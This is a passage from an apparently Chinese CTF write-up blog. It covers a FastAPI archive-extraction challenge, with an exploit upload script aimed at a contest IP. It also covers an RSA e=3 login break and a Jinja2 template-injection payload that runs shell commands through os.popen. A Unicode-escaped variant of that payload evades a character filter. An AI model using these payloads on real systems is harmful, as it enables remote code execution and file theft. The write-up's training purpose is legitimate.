an></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&#x2F;server.tar.gz可以加载源码</p><p>server.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode<span class="token keyword">import</span> os<span class="token keyword">from</span> pathlib <span class="token keyword">import</span> Path<span class="token keyword">from</span> tempfile <span class="token keyword">import</span> TemporaryDirectory<span class="token keyword">from</span> typing <span class="token keyword">import</span> Any<span class="token punctuation">,</span> Dict<span class="token punctuation">,</span> Optional<span class="token punctuation">,</span> Union<span class="token keyword">from</span> zipfile <span class="token keyword">import</span> is_zipfile<span class="token keyword">from</span> fastapi <span class="token keyword">import</span> FastAPI<span class="token punctuation">,</span> HTTPException<span class="token punctuation">,</span> UploadFile<span class="token keyword">from</span> fastapi<span class="token punctuation">.</span>responses <span class="token keyword">import</span> FileResponse<span class="token keyword">from</span> patoolib <span class="token keyword">import</span> extract_archive<span class="token keyword">from</span> patoolib<span class="token punctuation">.</span>util <span class="token keyword">import</span> PatoolError<span class="token keyword">import</span> timetags_metadata <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>        <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"extract"</span><span class="token punctuation">,</span>        <span class="token string">"description"</span><span class="token punctuation">:</span> <span class="token string">"上传压缩包解压读取"</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>        <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"sourcecode"</span><span class="token punctuation">,</span>        <span class="token string">"description"</span><span class="token punctuation">:</span> <span class="token string">"源码下载"</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">]</span>app <span class="token operator">=</span> FastAPI<span class="token punctuation">(</span>    title<span class="token operator">=</span><span class="token string">"unzip"</span><span class="token punctuation">,</span>    description<span class="token operator">=</span><span class="token triple-quoted-string string">"""hello world"""</span><span class="token punctuation">,</span>    version<span class="token operator">=</span><span class="token string">"0.0.1"</span><span class="token punctuation">,</span>    openapi_tags<span class="token operator">=</span>tags_metadata<span class="token punctuation">,</span>    license_info<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"v0.0.1"</span><span class="token punctuation">,</span>        <span class="token string">"url"</span><span class="token punctuation">:</span> <span class="token string">"https://www.300188.cn/"</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    contact<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"300188"</span><span class="token punctuation">,</span>        <span class="token string">"url"</span><span class="token punctuation">:</span> <span class="token string">"https://www.300188.cn/"</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    docs_url<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="token punctuation">)</span>ROOT_DIR <span class="token operator">=</span> Path<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>absolute<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>parentUPLOAD_DIR <span class="token operator">=</span> ROOT_DIR <span class="token operator">/</span> <span class="token string">"uploads"</span>FLAG_PATH <span class="token operator">=</span> ROOT_DIR <span class="token operator">/</span> <span class="token string">"flag.txt"</span>SOURCE_PATH <span class="token operator">=</span> ROOT_DIR <span class="token operator">/</span> <span class="token string">"server.tar.gz"</span><span class="token keyword">if</span> <span class="token keyword">not</span> UPLOAD_DIR<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    UPLOAD_DIR<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">"FLAG"</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> FLAG_PATH<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        FLAG_PATH<span class="token punctuation">.</span>write_text<span class="token punctuation">(</span>os<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">"FLAG"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">del</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">"FLAG"</span><span class="token punctuation">]</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> FileResponse<span class="token punctuation">(</span>ROOT_DIR <span class="token operator">/</span> <span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token keyword">if</span> SOURCE_PATH<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>get</span><span class="token punctuation">(</span><span class="token string">"/server.tar.gz"</span><span class="token punctuation">,</span> tags<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"sourcecode"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">code_download</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> FileResponse<span class="token punctuation">(</span>SOURCE_PATH<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read_files</span><span class="token punctuation">(</span>directory<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Path<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Union<span class="token punctuation">[</span>Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">,</span> Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Any<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>directory<span class="token punctuation">,</span> Path<span class="token punctuation">)</span><span class="token punctuation">:</span>        directory <span class="token operator">=</span> Path<span class="token punctuation">(</span>directory<span class="token punctuation">)</span>    contents<span class="token punctuation">:</span> Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Union<span class="token punctuation">[</span>Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">,</span> Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Any<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> path <span class="token keyword">in</span> directory<span class="token punctuation">.</span>iterdir<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> path<span class="token punctuation">.</span>is_dir<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            contents<span class="token punctuation">[</span>path<span class="token punctuation">.</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> read_files<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                content <span class="token operator">=</span> path<span class="token punctuation">.</span>read_bytes<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    contents<span class="token punctuation">[</span>path<span class="token punctuation">.</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>                <span class="token keyword">except</span> UnicodeDecodeError<span class="token punctuation">:</span>                    contents<span class="token punctuation">[</span>path<span class="token punctuation">.</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> b64encode<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> IOError<span class="token punctuation">:</span>                contents<span class="token punctuation">[</span>path<span class="token punctuation">.</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token keyword">return</span> contents<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>post</span><span class="token punctuation">(</span><span class="token string">"/extract"</span><span class="token punctuation">,</span> tags<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"extract"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">extract</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">:</span> UploadFile<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> TemporaryDirectory<span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token operator">=</span>UPLOAD_DIR<span class="token punctuation">)</span> <span class="token keyword">as</span> tmpdir<span class="token punctuation">:</span>        file_to_extract <span class="token operator">=</span> Path<span class="token punctuation">(</span>tmpdir<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_to_extract<span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                data <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>                    <span class="token keyword">break</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> is_zipfile<span class="token punctuation">(</span>file_to_extract<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">raise</span> HTTPException<span class="token punctuation">(</span>status_code<span class="token operator">=</span><span class="token number">415</span><span class="token punctuation">,</span> detail<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"The input file must be an ZIP archive."</span></span><span class="token punctuation">)</span>        <span class="token keyword">with</span> TemporaryDirectory<span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token operator">=</span>tmpdir<span class="token punctuation">)</span> <span class="token keyword">as</span> extract_to_dir<span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                extract_archive<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>file_to_extract<span class="token punctuation">)</span><span class="token punctuation">,</span> outdir<span class="token operator">=</span>extract_to_dir<span class="token punctuation">)</span>            <span class="token keyword">except</span> PatoolError <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">raise</span> HTTPException<span class="token punctuation">(</span>status_code<span class="token operator">=</span><span class="token number">400</span><span class="token punctuation">,</span> detail<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"Error extracting ZIP </span><span class="token interpolation"><span class="token punctuation">&#123;</span>file_to_extract<span class="token punctuation">.</span>name<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token conversion-option punctuation">!s</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                        <span class="token keyword">return</span> read_files<span class="token punctuation">(</span>extract_to_dir<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">import</span> uvicorn    uvicorn<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"server:app"</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">,</span> <span class="token builtin">reload</span><span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> workers<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <a href="https://ucasers.cn/zip%E5%9C%A8CTF-web%E6%96%B9%E5%90%91%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%94%A8%E6%B3%95/">https://ucasers.cn/zip%E5%9C%A8CTF-web%E6%96%B9%E5%90%91%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%94%A8%E6%B3%95/</a> </p><p>参考Symple Unzipper - justctf2022</p><p>漏洞代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">extract_archive<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>file_to_extract<span class="token punctuation">)</span><span class="token punctuation">,</span> outdir<span class="token operator">=</span>extract_to_dir<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>按照下面命令生成binbin.tar</p><p><img src="/images/image-20220915184107471.png" alt="image-20220915184107471"></p><p>使用脚本上传</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://39.101.70.208:15294/extract"</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'binbin.tar'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'binbin'</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回值就有flag</p><h2 id="ezPython"><a href="#ezPython" class="headerlink" title="ezPython"></a>ezPython</h2><p>app,py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span>  redirect<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span>session<span class="token keyword">import</span> conf<span class="token punctuation">,</span>module<span class="token keyword">from</span> jinja2 <span class="token keyword">import</span> Template<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> bytes_to_long app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span> template_folder<span class="token operator">=</span><span class="token string">'templates'</span><span class="token punctuation">,</span>static_folder<span class="token operator">=</span><span class="token string">"static"</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key<span class="token operator">=</span>conf<span class="token punctuation">.</span>secret_key<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>n<span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>e<span class="token operator">=</span><span class="token number">3</span>n<span class="token operator">=</span><span class="token number">18514780212625806429285953775609047798955454126757982877395041199382734650081463444991044571120039498235731694983465851879204280682574642534591596923014370904697459715174429877263916260602566572741047668300885495540757414739604193071159162811897694526614973785279331319754540677800571838105197465465085285412980704475274495801795696826580537039977789344412400415504281580231305152512126047803866963812493256158056339636452079430277895772356520230376168632471359382792133281566795983653444242174816767052659484714538791464276198761616909636648065598948238137938591161343264769368071386762954464324389370896617754443339</span> <span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method<span class="token operator">==</span><span class="token string">'GET'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'./login.html'</span><span class="token punctuation">)</span>    user<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span>    pwd<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'pwd'</span><span class="token punctuation">)</span>    user <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>user<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token punctuation">,</span>e<span class="token punctuation">)</span>    pwd <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>pwd<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token punctuation">,</span>e<span class="token punctuation">)</span>    <span class="token keyword">if</span> user<span class="token operator">==</span><span class="token number">73190274603755976985272728831589176</span> <span class="token keyword">and</span> pwd<span class="token operator">==</span><span class="token number">245706948983578125207381542250496498816013566056746784517750313129260641531958753796767585019918349086418623783735870113758961768070508663333735022553426097977049927</span><span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'user_info'</span><span class="token punctuation">]</span><span class="token operator">=</span>user        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'./login.html'</span><span class="token punctuation">,</span>msg<span class="token operator">=</span><span class="token string">'用户名或密码输入错误'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_info<span class="token operator">=</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'user_info'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> user_info<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/say_hello'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/say_hello'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">say_hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_info<span class="token operator">=</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'user_info'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> user_info<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method<span class="token operator">==</span><span class="token string">'GET'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'./say.html'</span><span class="token punctuation">)</span>    name<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    <span class="token keyword">return</span> module<span class="token punctuation">.</span>hello<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout_</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">del</span> session<span class="token punctuation">[</span><span class="token string">'user_info'</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/app.py'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">_app</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'app.py'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要解密进入</p><p>解密脚本参考 <a href="https://github.com/d4rkvaibhav/picoCTF-2018-Writeups/blob/master/Cryptography/SAFERSA/rsa.py">https://github.com/d4rkvaibhav/picoCTF-2018-Writeups/blob/master/Cryptography/SAFERSA/rsa.py</a> </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">import</span> gmpy2<span class="token keyword">except</span> ImportError<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Install gmpy2 first to run this program"</span><span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>n <span class="token operator">=</span> <span class="token number">18514780212625806429285953775609047798955454126757982877395041199382734650081463444991044571120039498235731694983465851879204280682574642534591596923014370904697459715174429877263916260602566572741047668300885495540757414739604193071159162811897694526614973785279331319754540677800571838105197465465085285412980704475274495801795696826580537039977789344412400415504281580231305152512126047803866963812493256158056339636452079430277895772356520230376168632471359382792133281566795983653444242174816767052659484714538791464276198761616909636648065598948238137938591161343264769368071386762954464324389370896617754443339</span>n <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">3</span>cipher <span class="token operator">=</span> <span class="token number">73190274603755976985272728831589176</span>cipher <span class="token operator">=</span> <span class="token number">245706948983578125207381542250496498816013566056746784517750313129260641531958753796767585019918349086418623783735870113758961768070508663333735022553426097977049927</span><span class="token keyword">import</span> gmpy2<span class="token comment"># f = open('cipher','rb')</span><span class="token comment"># cipher = int(f.read().encode('hex'),16)</span><span class="token keyword">with</span> gmpy2<span class="token punctuation">.</span>local_context<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>context<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> precision<span class="token operator">=</span><span class="token number">800</span><span class="token punctuation">)</span> <span class="token keyword">as</span> ctx<span class="token punctuation">:</span>    ctx<span class="token punctuation">.</span>precision <span class="token operator">+=</span> <span class="token number">800</span>    root <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>cbrt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token string">'%x'</span> <span class="token operator">%</span> <span class="token operator">+</span> <span class="token builtin">int</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> AttributeError<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token string">'%x'</span> <span class="token operator">%</span> <span class="token operator">+</span> <span class="token builtin">int</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解出：</p><p>admin</p><p>Admin@!123#T1wsc14e!-mW</p><p>然后登录，进入发现输出框，尝试模板注入发现被过滤</p><p>过滤了很多字符</p><p>{ } _ [ ] ‘ “等等</p><p>题目提示unicode，使用unicode字符绕过</p><p>原来的payload</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">&#123;&#123;binbin.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()")&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>unicode绕过的payload</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">｛｛binbin|attr(＂\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f＂)|attr(＂\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f＂)|attr(＂\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f＂)(＂\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f＂)|attr(＂\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f＂)(＂\u0065\u0076\u0061\u006c＂)(＂\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u0063\u0061\u0074\u0020\u002f\u0066\u002a\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029＂)｝｝<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="cry"><a href="#cry" class="headerlink" title="cry"></a>cry</h1><h3 id="Anti-Fermat"><a href="#Anti-Fermat" class="headerlink" 